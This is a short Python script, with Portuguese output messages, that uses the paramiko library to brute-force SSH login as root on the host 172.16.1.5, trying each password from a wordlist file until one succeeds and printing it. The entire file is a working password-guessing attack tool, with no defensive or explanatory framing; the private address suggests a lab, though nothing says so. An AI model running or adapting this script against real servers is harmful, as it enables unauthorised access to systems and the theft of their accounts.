#!/usr/bin/python

import paramiko

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.client.AutoAddPolicy)

ssh.load_system_host_keys()

wordlist = open('wl.txt')

for password in wordlist.readlines():
	password = password.strip()

	try:
		ssh.connect(hostname = '172.16.1.5', username='root', password=password)

	except paramiko.ssh_exception.AuthenticationException:
		print('Testando a senha => ', password)

	else:
		print('[+] Acesso Garantido => ', password)
		break
ssh.close()
